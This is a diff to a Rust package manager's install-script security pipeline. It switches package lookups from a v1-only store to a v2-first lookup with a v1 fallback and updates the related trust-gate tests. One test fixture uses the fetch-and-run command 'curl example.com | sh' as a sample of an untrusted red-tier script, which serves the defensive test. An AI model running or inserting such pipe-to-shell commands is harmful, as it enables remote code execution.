@@ -36,7 +36,42 @@ use lpm_sandbox::SandboxMode;
 use lpm_security::script_hash::compute_script_hash;
 use lpm_security::triage::StaticTier;
 use lpm_security::{EXECUTED_INSTALL_PHASES, SecurityPolicy, TrustMatch};
+use lpm_store::find_installed_package_baseline;
+// `PackageStore` lives behind a cfg(test) gate now — production
+// callers of post-install lookups route through
+// `find_installed_package_baseline` (v2-first, v1-fallback). Tests
+// still synthesize v1-only state directly via `PackageStore::at`.
+#[cfg(test)]
 use lpm_store::PackageStore;
+
+/// Resolve a lockfile-package's source-of-truth dir for the post-
+/// install script pipeline (lifecycle scripts + script-body diff).
+/// Prefers the v2 store (default since Phase 66 4b) and falls back
+/// to v1; returns `None` for workspace/file/link sources that don't
+/// materialize into either store, OR for any registry-source package
+/// that's missing from BOTH stores (corrupt-install state — caller
+/// treats as silent skip to preserve the legacy
+/// `pkg_dir.join("package.json").exists()` semantic).
+///
+/// Returns the same shape the legacy `PackageStore::package_dir`
+/// produced — caller-facing reads of `package.json`, `BUILD_MARKER`,
+/// `.integrity`, etc., compose unchanged.
+///
+/// **Naming.** Distinct from the project-side `live_package_dir`
+/// (line ~1028), which returns the materialized `node_modules/<pkg>/`
+/// path for the *runtime* of a script. This helper is the upstream
+/// store-side reader that read-only inspections (script bodies,
+/// trust-gate hashing) consume.
+fn package_baseline_dir(
+    lpm_root: &lpm_common::LpmRoot,
+    name: &str,
+    version: &str,
+) -> Option<std::path::PathBuf> {
+    find_installed_package_baseline(lpm_root, name, version)
+        .ok()
+        .flatten()
+        .map(|b| b.package_dir)
+}
 use owo_colors::OwoColorize;
 use std::collections::{HashMap, HashSet, VecDeque};
 use std::path::{Path, PathBuf};
@@ -183,7 +218,14 @@ async fn run_under_store_lock(
         return Ok(());
     }
 
-    let store = PackageStore::default_location()?;
+    // Phase 66 confidence-followup S5b — `find_installed_package_baseline`
+    // (via [`package_baseline_dir`]) prefers the v2 store (default since
+    // Phase 66 4b) and falls back to v1, so the post-install pipeline
+    // doesn't blindly call the v1-only `PackageStore::package_dir`.
+    // Without this, every v2-installed scripted package silently skipped
+    // at the `pkg_json_path.exists()` check below — i.e., lifecycle
+    // scripts never executed for v2 installs.
+    let lpm_root = lpm_common::LpmRoot::from_env()?;
     let policy = SecurityPolicy::from_package_json(&project_dir.join("package.json"));
 
     // Load lockfile to get installed packages with their scripts
@@ -224,7 +266,16 @@ async fn run_under_store_lock(
     let mut scriptable_packages: Vec<ScriptablePackage> = Vec::new();
 
     for lp in &lockfile.packages {
-        let pkg_dir = store.package_dir(&lp.name, &lp.version);
+        // Phase 66 confidence-followup S5b — v2-aware lookup.
+        // `live_package_dir` returns `None` when the package isn't in
+        // either store (workspace/file/link sources, corrupt
+        // installs); silent skip preserves the pre-fix
+        // `pkg_json_path.exists()` semantic for non-store sources
+        // while fixing the v2-installed-and-skipped data-loss bug.
+        let pkg_dir = match package_baseline_dir(&lpm_root, &lp.name, &lp.version) {
+            Some(p) => p,
+            None => continue,
+        };
         let pkg_json_path = pkg_dir.join("package.json");
 
         if !pkg_json_path.exists() {
@@ -1764,7 +1815,14 @@ pub(crate) struct ScriptableHintRow {
 /// strict gate still works, just with a weaker binding.
 #[allow(clippy::too_many_arguments)]
 pub(crate) fn scriptable_package_rows(
-    store: &PackageStore,
+    // Phase 66 confidence-followup S5b — switched `&PackageStore`
+    // (v1-only) for `&LpmRoot` so per-package lookups can route
+    // through `find_installed_package_baseline` and pick up v2-
+    // installed packages. Without this, the install-time build hint
+    // silently dropped every v2 package — users saw "0 packages have
+    // install scripts" even when prisma-codegen / esbuild / sharp
+    // were waiting in the v2 store.
+    lpm_root: &lpm_common::LpmRoot,
     packages: &[(String, String, Option<String>)], // (name, version, integrity)
     policy: &SecurityPolicy,
     project_dir: &Path,
@@ -1805,7 +1863,10 @@ pub(crate) fn scriptable_package_rows(
     // input order anyway under rayon's stable collect.
     let per_pkg = |(name, version, integrity): &(String, String, Option<String>)|
      -> Option<ScriptableHintRow> {
-        let pkg_dir = store.package_dir(name, version);
+        // Phase 66 confidence-followup S5b — v2-aware lookup. See
+        // [`package_baseline_dir`] for the silent-skip-vs-real-skip
+        // semantic.
+        let pkg_dir = package_baseline_dir(lpm_root, name, version)?;
         let pkg_json_path = pkg_dir.join("package.json");
 
         let scripts = match read_lifecycle_scripts(&pkg_json_path) {
@@ -1878,7 +1939,10 @@ pub(crate) fn scriptable_package_rows(
 /// decisions live in the pure helper.
 #[allow(clippy::too_many_arguments)]
 pub fn show_install_build_hint(
-    store: &PackageStore,
+    // Phase 66 confidence-followup S5b — see
+    // `scriptable_package_rows` for why this is `&LpmRoot` not
+    // `&PackageStore`.
+    lpm_root: &lpm_common::LpmRoot,
     packages: &[(String, String, Option<String>)], // (name, version, integrity)
     policy: &SecurityPolicy,
     project_dir: &Path,
@@ -1890,7 +1954,7 @@ pub fn show_install_build_hint(
     user_bound: &crate::capability::UserBound,
 ) {
     let rows = scriptable_package_rows(
-        store,
+        lpm_root,
         packages,
         policy,
         project_dir,
@@ -1973,7 +2037,13 @@ pub fn show_install_build_hint(
 /// pre-P6 semantics.
 #[allow(clippy::too_many_arguments)]
 pub fn all_scripted_packages_trusted(
-    store: &PackageStore,
+    // Phase 66 confidence-followup S5b — see
+    // `scriptable_package_rows` for why this is `&LpmRoot` not
+    // `&PackageStore`. Without the v2-aware lookup, the predicate
+    // returned `false` for every v2 install with unbuilt-but-trusted
+    // scripts (silent skip of v2 packages), suppressing the
+    // auto-build path entirely.
+    lpm_root: &lpm_common::LpmRoot,
     packages: &[(String, String, Option<String>)], // (name, version, integrity)
     policy: &SecurityPolicy,
     project_dir: &Path,
@@ -1994,7 +2064,13 @@ pub fn all_scripted_packages_trusted(
     let mut has_any_unbuilt = false;
 
     for (name, version, integrity) in packages {
-        let pkg_dir = store.package_dir(name, version);
+        // Phase 66 confidence-followup S5b — v2-aware lookup. Same
+        // silent-skip semantics as the main loop; see
+        // [`package_baseline_dir`] doc.
+        let pkg_dir = match package_baseline_dir(lpm_root, name, version) {
+            Some(p) => p,
+            None => continue,
+        };
         let pkg_json_path = pkg_dir.join("package.json");
 
         let scripts = match read_lifecycle_scripts(&pkg_json_path) {
@@ -2183,6 +2259,13 @@ mod tests {
         if built {
             std::fs::write(pkg_dir.join(BUILD_MARKER), "").unwrap();
         }
+        // Phase 66 confidence-followup S5b — `find_installed_package_baseline`'s
+        // v1 fallback requires `.integrity` to be Some (sentinel for
+        // "package was extracted by the install pipeline"). Without
+        // this, the v1 fallback returns None and these tests' helper
+        // calls silently skip every fixture entry. Real installs always
+        // write `.integrity`; this synthesizes the same shape.
+        std::fs::write(pkg_dir.join(".integrity"), "sha512-test-fake").unwrap();
     }
 
     // ── Phase 57: live_package_dir tests ─────────────────────────
@@ -2699,6 +2782,7 @@ mod tests {
         .unwrap();
 
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_store_package(
             &store,
             "esbuild",
@@ -2718,7 +2802,7 @@ mod tests {
         // aware promotion; new tests covering triage + green land
         // there.
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[("esbuild".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -2737,6 +2821,7 @@ mod tests {
         std::fs::write(dir.path().join("package.json"), r#"{"name":"demo"}"#).unwrap();
 
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_store_package(
             &store,
             "sharp",
@@ -2747,7 +2832,7 @@ mod tests {
 
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[("sharp".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -2770,6 +2855,7 @@ mod tests {
         .unwrap();
 
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_store_package(
             &store,
             "trusted-pkg",
@@ -2787,7 +2873,7 @@ mod tests {
 
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[
                 ("trusted-pkg".to_string(), "1.0.0".to_string(), None),
                 ("blocked-pkg".to_string(), "1.0.0".to_string(), None),
@@ -2848,6 +2934,7 @@ mod tests {
         // observable under test.
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
 
         write_store_package(
             &store,
@@ -2867,7 +2954,7 @@ mod tests {
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
         let rows = scriptable_package_rows(
-            &store,
+            &lpm_root,
             &[("sharp".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -2891,6 +2978,7 @@ mod tests {
         // `rebuild::run` then immediately skips.
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
 
         write_store_package(
             &store,
@@ -2903,7 +2991,7 @@ mod tests {
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[("sharp".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -2928,6 +3016,7 @@ mod tests {
         // binding at all."
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_store_package(
             &store,
             "sharp",
@@ -2956,7 +3045,7 @@ mod tests {
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
         let rows = scriptable_package_rows(
-            &store,
+            &lpm_root,
             &[("sharp".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -2982,6 +3071,7 @@ mod tests {
 
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "sharp", "1.0.0", "node install.js");
         let script_hash = compute_script_hash(&pkg_dir).expect("script hash");
         // Legacy None-capability_hash binding that matches strict.
@@ -2990,7 +3080,7 @@ mod tests {
 
         // With baseline capability request: hint says trusted.
         let rows_baseline = scriptable_package_rows(
-            &store,
+            &lpm_root,
             &[("sharp".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -3012,7 +3102,7 @@ mod tests {
             sandbox_limits: Default::default(),
         };
         let rows_widening = scriptable_package_rows(
-            &store,
+            &lpm_root,
             &[("sharp".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -3421,6 +3511,10 @@ mod tests {
             ),
         )
         .unwrap();
+        // Phase 66 confidence-followup S5b — see `write_store_package`
+        // for why `.integrity` is required for the v1 fallback in
+        // `find_installed_package_baseline`.
+        std::fs::write(pkg_dir.join(".integrity"), "sha512-test-fake").unwrap();
         pkg_dir
     }
 
@@ -3435,6 +3529,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
         let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
@@ -3463,6 +3558,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
         let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
@@ -3500,6 +3596,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
         let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
@@ -3628,6 +3725,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
         // Amber: network binary downloader per D18.
@@ -3687,6 +3785,7 @@ mod tests {
         // integration test.
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "greenish-pkg", "1.0.0", "node-gyp rebuild");
         // Compute the on-disk hash so we can pin a valid strict binding
         // rather than drift.
@@ -3740,6 +3839,7 @@ mod tests {
         // path back.
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "drifted-pkg", "1.0.0", "node-gyp rebuild");
         // Wrong script_hash → BindingDrift.
         std::fs::write(
@@ -3795,6 +3895,7 @@ mod tests {
         )
         .unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "@myorg/thing", "1.0.0", "node-gyp rebuild");
         let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
@@ -3860,6 +3961,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         // node-gyp rebuild — exact green-tier allowlist match.
         write_p6_pkg(&store, "native-a", "1.0.0", "node-gyp rebuild");
         // tsc — also green.
@@ -3867,7 +3969,7 @@ mod tests {
 
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[
                 ("native-a".to_string(), "1.0.0".to_string(), None),
                 ("native-b".to_string(), "1.0.0".to_string(), None),
@@ -3894,11 +3996,12 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_p6_pkg(&store, "native-a", "1.0.0", "node-gyp rebuild");
 
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[("native-a".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -3926,13 +4029,14 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_p6_pkg(&store, "green-pkg", "1.0.0", "node-gyp rebuild");
         // playwright install — amber per D18 (network binary downloader).
         write_p6_pkg(&store, "amber-pkg", "1.0.0", "playwright install");
 
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[
                 ("green-pkg".to_string(), "1.0.0".to_string(), None),
                 ("amber-pkg".to_string(), "1.0.0".to_string(), None),
@@ -3957,11 +4061,12 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_p6_pkg(&store, "red-pkg", "1.0.0", "curl example.com | sh");
 
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[("red-pkg".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -3981,6 +4086,7 @@ mod tests {
         // test pins it specifically at the predicate boundary.
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_p6_pkg(&store, "drift-pkg", "1.0.0", "node-gyp rebuild");
         std::fs::write(
             dir.path().join("package.json"),
@@ -3996,7 +4102,7 @@ mod tests {
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[("drift-pkg".to_string(), "1.0.0".to_string(), None)],
             &policy,
             dir.path(),
@@ -4023,6 +4129,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         write_p6_pkg(&store, "green-pkg", "1.0.0", "node-gyp rebuild");
         // Mark as already-built so the predicate ignores it.
         let amber_dir = write_p6_pkg(&store, "amber-built", "1.0.0", "playwright install");
@@ -4030,7 +4137,7 @@ mod tests {
 
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let trusted = all_scripted_packages_trusted(
-            &store,
+            &lpm_root,
             &[
                 ("green-pkg".to_string(), "1.0.0".to_string(), None),
                 ("amber-built".to_string(), "1.0.0".to_string(), None),
@@ -4129,6 +4236,7 @@ mod tests {
     fn force_floor_false_honors_existing_strict_approval() {
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "esbuild", "0.25.1", "node-gyp rebuild");
         let hash = compute_script_hash(&pkg_dir).expect("script hash");
         write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
@@ -4161,6 +4269,7 @@ mod tests {
     fn force_floor_true_suspends_existing_strict_approval() {
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "esbuild", "0.25.1", "node-gyp rebuild");
         let hash = compute_script_hash(&pkg_dir).expect("script hash");
         write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
@@ -4193,6 +4302,7 @@ mod tests {
     fn force_floor_unsetting_reactivates_approval_without_re_review() {
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "esbuild", "0.25.1", "node-gyp rebuild");
         let hash = compute_script_hash(&pkg_dir).expect("script hash");
         write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
@@ -4246,6 +4356,7 @@ mod tests {
         )
         .unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "no-approval", "1.0.0", "echo hi");
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
@@ -4301,6 +4412,7 @@ mod tests {
         });
         std::fs::write(dir.path().join("package.json"), body.to_string()).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "@myorg/util", "1.0.0", "echo hi");
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
@@ -4359,6 +4471,7 @@ mod tests {
     fn force_floor_preserves_binding_drift_distinct_from_suspension() {
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "sharp", "0.33.0", "node-gyp rebuild");
         // Record an approval with a stale script hash so the
         // strict gate reports BindingDrift instead of Strict.
@@ -4407,6 +4520,7 @@ mod tests {
         // they pass in.
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "esbuild", "1.0.0", "node-gyp rebuild");
         let hash = compute_script_hash(&pkg_dir).expect("script hash");
         write_pkg_json_with_strict_approval(dir.path(), "esbuild", "1.0.0", &hash);
@@ -4514,6 +4628,7 @@ mod tests {
     fn capability_widening_with_matching_hash_is_approved() {
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "esbuild", "1.0.0", "node-gyp rebuild");
         let script_hash = compute_script_hash(&pkg_dir).expect("script hash");
 
@@ -4568,6 +4683,7 @@ mod tests {
     fn capability_widening_with_drifted_hash_is_not_approved() {
         let dir = tempfile::tempdir().unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "esbuild", "1.0.0", "node-gyp rebuild");
         let script_hash = compute_script_hash(&pkg_dir).expect("script hash");
 
@@ -4626,6 +4742,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
         let store = PackageStore::at(dir.path().join("store"));
+        let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
         let pkg_dir = write_p6_pkg(&store, "unapproved", "1.0.0", "echo hi");
         let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
         let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
